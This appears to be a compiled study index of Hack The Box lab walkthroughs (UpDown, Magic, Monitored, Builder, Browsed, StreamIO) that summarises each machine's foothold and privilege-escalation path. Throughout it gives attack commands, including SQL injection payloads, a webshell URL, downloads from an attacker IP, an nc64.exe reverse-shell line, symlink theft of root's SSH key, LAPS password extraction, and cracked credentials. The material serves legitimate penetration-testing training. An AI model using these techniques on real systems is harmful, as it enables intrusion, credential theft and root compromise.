UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed. On the Apache server a web application is featured that allows users to check if a webpage is up. A directory named .git is identified on the server and can be downloaded to reveal the source code of the dev subdomain running on the target, which can only be accessed with a special HTTP header. Furthermore, the subdomain allows files to be uploaded, leading to remote code execution using the phar:// PHP wrapper. The Pivot consists of injecting code into a SUID Python script and obtaining a shell as the developer user, who may run easy_install with Sudo , without a password. This can be leveraged by creating a malicious python script and running easy_install on it, as the elevated privileges are not dropped, allowing us to maintain access as root .

### Remote enumeration and foothold checks

- Run vhost fuzzing with a response-size filter because invalid Host headers all return HTTP 200; discover dev.siteisup.htb.
- Directory enumeration exposes .git; dump the repository and inspect source/history for the dev-only header and upload logic.
- Supply the required special HTTP header to access the dev vhost; without it the host appears unavailable.
- Review PHP blacklist/extension validation and use a ZIP/PHAR polyglot plus phar:// inclusion to execute an uploaded PHP payload.
- The dumped .htaccess gives the exact gate for the developer vhost: send the HTTP header Special-Dev: only4dev; without that header dev.siteisup.htb intentionally denies access.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.

### Post-foothold local enumeration and lateral movement

- After the www-data shell, inspect the custom SUID Python helper and its source/import behavior.
- Inject Python code through the input path the SUID script evaluates to pivot to developer.
- Read developer's SSH private key from the accessible home/dev path and use it for a stable SSH session.

### User path

**Memory chain:** SSH → virtual-host enumeration → directory/file discovery → subdomain enumeration → Git history/config → configuration-file secrets → group-membership abuse → source-code review → LFI/local file read → web shell/RCE

- Inside we find a couple of interesting files, one of which is .htaccess , which is an Apache configuration file responsible for redirecting traffic, blocking users, password-protecting directories, and other administrative functions.
- could do this manually for every request, but BurpSuite allows us to automate this task by adding an entry in the Proxy -> Options section, under Match and Replace.
- Doing so allows us access to the developer subdomain, which is a site similar in function and form to the first website we came across.
- Unfortunately, the PHP info page reveals some functions such as system() , shell_exec() , and popen() to be disabled, meaning we will have to find a different approach to gain a foothold on the target.
- run the setuid executable and try injecting the payload. ./siteisup __import__('os').system('/bin/bash') The payload is executed successfully and we obtain a shell as the developer user.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV`
- `ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w`
- `gobuster dir -u http://siteisup.htb/ -w /usr/share/wordlists/dirb/common.txt`
- `gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/dirb/common.txt`
- `ssh -i id_rsa developer@siteisup.htb`

### Artifacts and exact search anchors

`/etc/hosts`, `siteisup.htb`, `FUZZ.siteisup.htb`, `/usr/share/wordlists/subdomains.txt`, `dev.siteisup.htb`, `/usr/share/wordlists/dirb/common.txt`, `index.php`, `checker.php`, `info.php`, `info.zip`, `defunct-bypasser.py`, `dfunc-bypasser.py`, `rev.php`, `rev.zip`, `/etc/passwd`, `/home/developer/`, `/home/developer/.ssh/id_rsa`, `/home/developer/user.txt`

Open the PDF around page **9** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Run sudo -l as developer; easy_install may run as root without a password.
- Create a malicious Python package/setup.py whose install action spawns a shell or writes a privileged key.
- Invoke the package with sudo easy_install and retain the resulting root execution.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Root / Administrator path

**Memory chain:** SSH → sudo rule abuse → SUID abuse

- Searching for easy_install shows that it can in fact be abused to spawn a shell with elevated privileges.
- While there are multiple possibilities listed, we are primarily interested in the Sudo section, which states that when easy_install is ran as the superuser, the elevated privileges are not dropped, allowing us to maintain access as that user.
- Firstly, a temporary directory is created, wherein a Python script that spawns a /bin/sh shell is subsequently created.
- Since easy_install is a (deprecated) Python module which installs Python libraries, the final part of the PoC consists of 'installing' the script we just created (using sudo ), which will trigger the payload and spawn a shell as root .
- The final flag can be found at /root/root.txt .

#### Commands and PDF search strings

- `sudo -l`

### Artifacts and exact search anchors

`setup.py`, `/root/root.txt`

Open the PDF around page **18** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 41- Magic

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Magic.md) · [Official PDF](./htb-writeups/Magic.pdf)

### Machine path overview

Magic is an easy diﬃculty Linux machine that features a custom web application. A SQL injection vulnerability in the login form is exploited, in order to bypass the login and gain access to an upload page. Weak whitelist validation allows for uploading a PHP webshell, which is used to gain command execution. The MySQL database is found to contain plaintext credentials, which are reused for lateral movement. A path hijacking vector combined with assigned SUID permissions leads to full system compromise.

### Remote enumeration and foothold checks

- Manually test the login form for SQL injection and use it to bypass authentication to the upload page.
- Bypass the image-extension whitelist with a valid image header plus PHP payload and a double/allowed filename, then locate the uploaded path.
- Trigger the uploaded PHP through Apache to obtain a www-data shell.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Post-foothold local enumeration and lateral movement

- Read /var/www/Magic/db.php5 for local MySQL credentials instead of relying only on process/environment enumeration.
- MySQL listens on loopback; use local mysql tools or reverse-port-forward 127.0.0.1:3306 with chisel.
- Query the database for plaintext/reusable credentials and use them to switch to theseus.

### User path

**Memory chain:** directory/file discovery → authentication bypass → SQL injection → reverse shell → web shell/RCE → group-membership abuse → database enumeration

- The Username and Password ﬁelds of the login form are found to be vulnerable to SQL injection, using a basic payload such as ' or 1=1-- - .
- As expected, we gain access to a page that allows us to upload images.
- Using the browser or cURL, the whoami command reveals that we have gained a foothold on the machine as www-data . http://10.10.10.185/images/uploads/webshell.php.jpg?0=whoami Let's start a listener using Netcat, and attempt to get a reverse shell.
- This ﬁle is found to contain database connection credentials. cat /var/www/Magic/db.php5 However, trying to switch to the user theseus with this password results in an authentication failure.
- examine the data it contains. select * from login; This reveals the plaintext password for user admin .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.185`
- `gobuster dir -u 10.10.10.185 -w /usr/share/dirb/wordlists/common.txt -x php`
- `gobuster dir -u 10.10.10.185/images -w /usr/share/dirb/wordlists/common.txt -x`
- `wget http://10.10.14.7:8080/chisel_1.7.0-rc8_linux_amd64`
- `select * from login;`

### Artifacts and exact search anchors

`/usr/share/dirb/wordlists/common.txt`, `upload.php`, `test.php`, `webshell.php`, `/var/www`, `/var/www/Magic/db.php5`, `chisel_1.7.0-rc8_linux_amd64.gz`, `/home/theseus/user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Enumerate SUID files and inspect /bin/sysinfo with strings; it invokes system utilities by unqualified names.
- Exploit the inherited PATH by placing a malicious fake utility in a writable directory prepended to PATH.
- Execute the SUID sysinfo binary to run the fake utility as root.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Root / Administrator path

**Memory chain:** SUID abuse → PATH hijacking → group-membership abuse → reverse shell

- The following command can be used to enumerate SUID ﬁles on the box. find / -perm -4000 -exec ls -l {} \; 2>/dev/null This reveals the interesting binary /bin/sysinfo .
- The SUID bit s ensures that the program is run with root privileges.
- Executing the binary returns system information, which low-privileged users don't usually have access to.
- This reveals the commands it invokes in order to retrieve system information. strings /bin/sysinfo Looking at the CPU Info section, the program is seen to use cat /proc/cpuinfo instead of /bin/cat /proc/cpuinfo .

#### Commands and PDF search strings

- `find / -perm -4000 -exec ls -l {} \; 2>/dev/null`
- `wget http://10.10.14.7:8080/socat`

### Artifacts and exact search anchors

`/proc/cpuinfo`, `/usr/bin/local`, `/tmp/cat`, `/usr/local/sbin/cat`, `/root/root.txt`

Open the PDF around page **14** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 42- Monitored

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Monitored.md) · [Official PDF](./htb-writeups/Monitored.pdf)

### Machine path overview

Monitored is a medium-difficulty Linux machine that features a Nagios instance. Credentials for the service are obtained via the SNMP protocol, which reveals a username and password combination provided as command-line parameters. Using the Nagios API, an authentication token for a disabled account is obtained, which leads to access to the application's dashboard. From there, a SQL injection ( CVE-202340931 ) is abused to obtain an administrator API key, with which a new admin account is created and used to run arbitrary commands on the instance, leading to a reverse shell. Finally, sudo access to a bash script is abused to read the root user's SSH key and authenticate as root .

### Remote enumeration and foothold checks

- Follow the HTTPS redirect to nagios.monitored.htb, then perform a UDP scan when the Nagios version/credentials are not exposed over HTTP.
- SNMP process/command-line enumeration reveals the svc Nagios username/password passed as service arguments.
- The svc account is disabled for normal login; use the Nagios XI API endpoint to obtain an authentication token and access /nagiosxi/index.php?token=... .
- Exploit CVE-2023-40931 SQL injection in the announcement-banner component to extract an administrator API key.
- Use the API key to create a new administrator account and define/run a Nagios check command for a reverse shell.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.

### Post-foothold local enumeration and lateral movement

- Run sudo -l as nagios and inspect the allowed getprofile.sh script plus every file it sources/archives.
- Trace getprofile.sh paths under /usr/local/nagiosxi and its temporary phpmailer.log handling rather than treating it as a generic sudo shell escape.

### User path

**Memory chain:** SSH → LDAP enumeration → virtual-host enumeration → SNMP enumeration → SQL injection → database enumeration → web shell/RCE → group-membership abuse → reverse shell

- SNMP allows devices to share information about their configuration and activity.
- Now that we know the service's version and are authenticated, we can start researching exploits to see how we can gain access to the system.
- Instead, we make use of the API key returned for the administrator's account, nagiosadmin .
- Foothold We can use the API key to add a new admin user via the API, as shown in this older exploit. curl -k --silent "http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey=IudGPHd9pEKiee9MkJ7ggPD89q 3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=tcg&password=YoullNeverGuessThis&name=TCG&email=tcg@localhost&auth_level=admin" Now we can log in as the user tcg:YoullNeverGuessThis , and should have admin privileges.
- select ashell as the Check Command and click on Run check command : We get a callback on our listener and land a shell as nagios : The user flag can be found at /home/nagios/user.txt .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.230.96`
- `sudo nmap -sU --top-ports 10 -sV 10.129.230.96`
- `snmpwalk -v 2c -c public nagios.monitored.htb`
- `curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d`
- `curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d`
- `curl -k -L 'http://YOURXISERVER/nagiosxi/includes/components/nagioscore/ui/trends.php?`
- `sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?`
- `curl -k --silent`

### Artifacts and exact search anchors

`nagios.monitored.htb`, `/etc/hosts`, `trends.php`, `index.php`, `banner_message-ajaxhelper.php`, `/home/nagios/user.txt`

Open the PDF around page **9** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Exploit the privileged profile collection's symlink/file handling by controlling the expected phpmailer.log path and pointing it at /root/.ssh/id_rsa.
- Run sudo getprofile.sh, extract profile.zip, recover the copied root private key, fix permissions, and SSH as root.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Root / Administrator path

**Memory chain:** sudo rule abuse → source-code review → configuration-file secrets → symlink/race-condition abuse → SSH → private-key discovery

- This oversight allows for several types of filesystem attacks, most notably: Symbolic Link Attacks: A user could create a symbolic link ( symlink ) named phpmailer.log that points to a sensitive file (e.g., /root/.ssh/id_rsa ).
- Create a Symlink: We create a symlink named phpmailer.log in the /usr/local/nagiosxi/tmp/ directory that points to a sensitive file, such as the root user's SSH private key: ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log 2.
- Access the Copied Data: The script would follow the symlink and copy the contents of root 's SSH private key into the profile folder under our control, e.g., /usr/local/nagiosxi/var/components/profile/attacker_folder/phpmailer.log .
- use the following command sequence to exploit the vulnerability: rm /usr/local/nagiosxi/tmp/phpmailer.log ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1 cp /usr/local/nagiosxi/var/components/profile.zip /tmp/ cd /tmp unzip profile.zip cat profile-<ID>/phpmailer.log The phpmailer.log file now contains the root user's private SSH key, which we save locally.
- apply 600 permissions to the file, then use it to authenticate to the target as root . chmod 600 id_rsa ssh root@nagios.monitored.htb -i id_rsa The final flag can be found at /root/root.txt .

#### Commands and PDF search strings

- `sudo -l`
- `sudo ./getprofile.sh 1`
- `sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1`
- `ssh root@nagios.monitored.htb -i id_rsa`

### Artifacts and exact search anchors

`getprofile.sh`, `/usr/local/nagiosxi/tmp/phpmailer.log`, `/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log`, `/usr/local/nagiosxi/tmp/`, `/usr/local/nagiosxi/var/components/profile/`, `/root/.ssh/id_rsa`, `/usr/local/nagiosxi/`, `/etc/ssh/sshd_config`, `/usr/local/nagiosxi/var/components/profile/attacker_folder/phpmailer.log`, `/usr/local/nagiosxi/scripts/components/getprofile.sh`, `/usr/local/nagiosxi/var/components/profile.zip`, `profile.zip`, `nagios.monitored.htb`, `/root/root.txt`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 43- Builder

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Builder.md) · [Official PDF](./htb-writeups/Builder.pdf)

### Machine path overview

Builder is a medium-difficulty Linux machine that features a Jenkins instance. The Jenkins instance is found to be vulnerable to the CVE-2024-23897 vulnerability that allows unauthenticated users to read arbitrary files on the Jenkins controller file system. An attacker is able to extract the username and password hash of the Jenkins user jennifer . Using the credentials to login into the remote Jenkins instance, an encrypted SSH key is exploited to obtain root access on the host machine.

### Remote enumeration and foothold checks

- Fingerprint Jenkins 2.441 and test CVE-2024-23897 CLI arbitrary-file read before attempting authentication.
- Use the Jenkins CLI exploit to read /var/jenkins_home/users/users.xml and the per-user config.xml rather than guessing Linux home paths.
- Recover jennifer's Jenkins password hash from the user config and crack it offline.
- Authenticate to Jenkins and inspect jobs/workspaces/credentials for the encrypted root SSH private key.
- Jenkins CLI help @file leaks only the first lines; switch to connect-node @/var/jenkins_home/users/users.xml and connect-node @.../config.xml to recover complete multiline XML, the user directory, and password hash.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.

### Post-foothold local enumeration and lateral movement

- Reproduce Jenkins secret decryption locally in the matching Jenkins Docker version when necessary; obtain master.key and hudson.util.Secret through file read.
- Use the cracked Jenkins account and decrypted credential material to recover the encrypted root SSH key/passphrase.

### User path

**Memory chain:** SSH → CVE-2024-23897 → LFI/local file read → Docker/container escape → password cracking → configuration-file secrets → private-key discovery

- Looking for available proof of concepts, we find this repository that uses jenkins-cli.jar to exploit the vulnerability.
- COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash) It seems like the exploit worked and we leaked some lines from the /etc/passwd file of the remote machine.
- save the hash in a file and use john to crack it and get a clear text password. john hash -w=/usr/share/wordlists/rockyou.txt princess Using the credentials jennifer:princess , we can log into the remote Jenkins instance.
- Privilege Escalation - Method 1 Looking at the Jenkins environment, we notice that there is a credential stored on Jenkins, with the name root .
- check if the SSH key is valid for the host machine, as the root user.

#### Commands and PDF search strings

- `nmap -p$ports -sV -sC 10.129.230.220`
- `wget 10.129.230.220:8080/jnlpJars/jenkins-cli.jar`
- `john hash -w=/usr/share/wordlists/rockyou.txt`
- `ssh -i root_key root@10.129.230.220`

### Artifacts and exact search anchors

`CVE-2024-23897`, `/etc/passwd`, `/usr/sbin`, `/usr/sbin/nologin`, `/proc/self/environ`, `/var/jenkins_home`, `/var/jenkins_home/user.txt`, `users.xml`, `config.xml`, `/var/jenkins_home/users/users.xml`, `/var/jenkins_home/users/jennifer_12108429903186576833/config.xml`, `/usr/share/wordlists/rockyou.txt`, `/root/.ssh/id_rsa`, `/root/root.txt`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Preferred path: decrypt/convert the recovered root SSH key, chmod 600, and SSH directly as root.
- Document the first writeup method accurately: use the installed SSH Agent plugin in a Jenkins Pipeline with sshagent(credentials: ['1']) to SSH as root and read /root/.ssh/id_rsa.
- Document the second method accurately: use the authenticated Jenkins /script console and hudson.util.Secret.decrypt(<encrypted credential>) to decrypt the stored root SSH key, then use that key for root SSH.

### Root / Administrator path

**Memory chain:** SSH → private-key discovery

- After we've identified the existance of the SSH credential object, we click on the update button.
- Then, using the Developer Tools of our browser and inspecting the Concealed for Confidentiality field, we can grab the encrypted SSH key.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 44- Browsed

**Target:** Linux · Medium

[Detailed notes](./htb-writeups/Browsed.md) · [Official PDF](./htb-writeups/Browsed.pdf)

### Machine path overview

Browsed is a medium-difficulty Linux machine centred around abusing browser extension functionality to access internal services. By uploading a malicious Chrome extension, we intercept a developer’s browsing activity and uncover an internal Gitea instance hosting a Flask application. Source code analysis reveals a command injection vulnerability in a bash script exposed via a localhost-only endpoint, which we exploit by delivering a second extension to trigger the payload through the developer’s browser and obtain a reverse shell as user larry . For privilege escalation, the machine demonstrates insecure handling of Python bytecode: writable access to the __pycache__ directory allows replacing a trusted .pyc file, resulting in arbitrary code execution as root.

### Remote enumeration and foothold checks

- Inspect the browser-extension upload feature and supplied extension ZIP structure; build a valid manifest/background service worker rather than uploading arbitrary files.
- Upload an extension that exfiltrates the developer browser's current URL/DOM activity to an attacker-controlled listener.
- The developer's browser reveals browsedinternals.htb; add it to /etc/hosts and access the internal Gitea instance.
- Read the Flask repository/source and routines.sh; identify the command injection exposed only through a localhost endpoint.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Post-foothold local enumeration and lateral movement

- Create a second extension whose background worker requests the localhost-only vulnerable endpoint from inside the developer's browser context.
- Encode the payload exactly as the bash/Flask route expects and package the extension correctly so installation triggers it automatically.
- Catch the reverse shell as larry and recover larry's SSH key for a stable session.

### User path

**Memory chain:** SSH → Git history/config → source-code review → command injection → reverse shell → private-key discovery

- The website allows users to upload their own Chrome extensions and states that a team member will review and test them.
- Looking into routines.sh file, we find the following line. if [[ "$1" -eq 0 ]]; then This introduces a subtle command injection vulnerability, which is explained in detail here.
- The -eq operator forces bash to interpret the input as an arithmetic expression, which allows constructs like $() to be evaluated during parsing.
- Since the Chrome version in use relies on Manifest v3, background scripts run as service workers, which are automatically executed when the extension is loaded or initialized by the browser.
- This works because the extension runs in the context of the developer’s browser, allowing it to access localhost services.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.244.79`
- `ssh -i id_larry.rsa larry@10.129.244.79`

### Artifacts and exact search anchors

`manifest.json`, `addon.zip`, `y:\n$`, `browsedinternals.htb`, `/etc/hosts`, `app.py`, `routines.sh`, `/etc/passwd`, `/proc/$$/fd/1`, `/usr/bin/zsh`, `/usr/sbin`, `/usr/sbin/nologin`, `pwn.zip`, `/home/larry/user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Enumerate writable application paths and notice a root-owned Python program imports a module whose __pycache__ directory is group writable.
- Compile/replace the expected version-tagged .pyc file (for example the module's cpython-312.pyc), preserving the filename/import expectations.
- Wait for or trigger the trusted root process to import the poisoned bytecode and execute the payload as root.
- Merely compiling/copying a malicious .pyc is insufficient: run the sudo tool once to create the legitimate extension_utils.cpython-312.pyc, copy its first 16-byte header onto the malicious bytecode, delete/replace the original cache file, then invoke the sudo tool again.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Root / Administrator path

**Memory chain:** sudo rule abuse → source-code review

- When the script imports the module, Python loads our malicious .pyc file instead of the original one, causing our payload to execute with root privileges.
- This results in a root shell. larry@browsed:/tmp/__pycache__$ sudo /opt/extensiontool/extension_tool.py -ext Fontify root@browsed:/tmp/__pycache__# id uid=0(root) gid=0(root) groups=0(root) The root flag can be found in /root/root.txt . # cat /root/root.txt

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`/opt/extensiontool/extension_tool.py`, `extension_tool.py`, `/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/opt/extensiontool`, `/opt/extensiontool$`, `extension_utils.py`, `/usr/bin/python3.12`, `/tmp/evil_module.py`, `evil_module.py`, `/tmp/create_header.py`, `create_header.py`, `/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc`, `/tmp/__pycache__/evil_module.cpython-312.pyc`, `/opt/extensiontool/__pycache__/extension_utils.cpyth`, `/tmp/__pycache__$`, `/tmp/__pycache__`, `/root/root.txt`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 45- StreamIO

**Target:** Windows · Medium

[Detailed notes](./htb-writeups/StreamIO.md) · [Official PDF](./htb-writeups/StreamIO.pdf)

### Machine path overview

StreamIO is a medium machine that covers subdomain enumeration leading to an SQL injection in order to retrieve stored user credentials, which are cracked to gain access to an administration panel. The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system. After the initial shell we leverage the SQLCMD command line utility to enumerate databases and obtain further credentials used in lateral movement. As the secondary user we use WinPEAS to enumerate the system and find saved browser databases, which are decoded to expose new credentials. Using the new credentials within BloodHound we discover that the user has the ability to add themselves to a specific group in which they can read LDAP secrets. Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the Core Staff group, then access LDAP to disclose the administrator LAPS password.

### Remote enumeration and foothold checks

- Inspect the TLS certificate for watch.streamio.htb and enumerate PHP paths on both streamio.htb and the watch vhost.
- Manually exploit MSSQL UNION injection on watch.streamio.htb/search.php when sqlmap fails; enumerate tables and extract/crack application credentials.
- Use cracked credentials to enter the hidden/admin panel, then test its page parameter for LFI with PHP wrappers to read source.
- Source review exposes an include/RFI path; host a PHP payload and have the target include it to obtain the first shell.
- Fuzz authenticated admin query parameters to find debug; read source with /admin/?debug=php://filter/convert.base64-encode/resource=index.php and repeat for master.php.
- Trigger RFI/RCE with a POST to /admin/?debug=master.php and an include=http://<attacker>/test.php parameter; master.php must be included through index.php because direct access is blocked.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
- Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.

### Post-foothold local enumeration and lateral movement

- Use local SQLCMD from the initial shell to enumerate the backup database and recover credentials for lateral movement to another user.
- Run WinPEAS under the secondary user and collect Firefox key4.db plus logins.json; decrypt them together offline with firepwd.
- Use the newly recovered account for BloodHound and inspect group-control edges rather than only local privileges.
- Abuse the user's ability to add itself to Core Staff, then query LDAP secrets exposed only to that group.

### User path

**Memory chain:** subdomain enumeration → SQL injection → LFI/local file read → source-code review → RFI → database enumeration → DPAPI/browser secrets → BloodHound path analysis → group-membership abuse → LDAP enumeration

- The administration panel is vulnerable to LFI, which allows us to retrieve the source code for the administration pages and leads to identifying a remote file inclusion vulnerability, the abuse of which gains us access to the system.
- Without direct access to the account we use PowerShell to abuse this feature and add ourselves to the Core Staff group, then access LDAP to disclose the administrator LAPS password.
- 10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- - Taking a hash from the results we use this site to identify the hash type.
- Using this application we attempt to retrieve the current database name and all the other database names. sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name FROM master..sysdatabases;' This is unsuccessful due to the current shell we have.
- The output shows that there is a backup of the original STREAMIO database.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.158`
- `sudo sed -i 's/streamio.htb/streamio.htb watch.streamio.htb/g' /etc/hosts`
- `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u`
- `ffuf -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt -u`
- `sudo python3 -m http.server 80`
- `wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe`
- `cme winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'`

### Artifacts and exact search anchors

`StreamIO.htb`, `/etc/hosts`, `watch.streamio.htb`, `index.php`, `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`, `search.php`, `login.php`, `/opt/seclists/Discovery/Web-Content/burp-parameter-names.txt`, `user_inc.php`, `staff_inc.php`, `movie_inc.php`, `master.php`, `test.php`, `c:\\windows\\temp\\nc64.exe`, `c:\\windows\\temp\\nc64.exe 10.10.14.23 4444 -e cmd.exe`

Open the PDF around page **1** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- After joining Core Staff, query LDAP for the LAPS attribute/password on the target computer object.
- Use the host-specific LAPS Administrator password for the final privileged connection.
- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.

### Root / Administrator path

**Memory chain:** WinRM → DPAPI/browser secrets → Git history/config → SMB enumeration → BloodHound path analysis → ACL abuse → LAPS password retrieval → group-membership abuse → GPP cpassword recovery → LDAP enumeration

- notice that there is a FireFox database file which may contain some credentials.
- can see that the domain user JDgodd has WriteOwner over the group CORE STAFF and CORE STAFF have LAPS read ability on the domain controller, which will allow anyone in the CORE STAFF group to read the LAPS passwords for any user.
- To abuse this we need to add JDgodd to the CORE STAFF group and then request the LAPS password of the administrator.
- can now use the ldapsearch utility to extract the administrator password from LAPS.
- This link features a good explanation of this process. ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd We have successfully extracted the Administrator password -6/8RYZp4hY6t) .

#### Commands and PDF search strings

- `wget https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py`
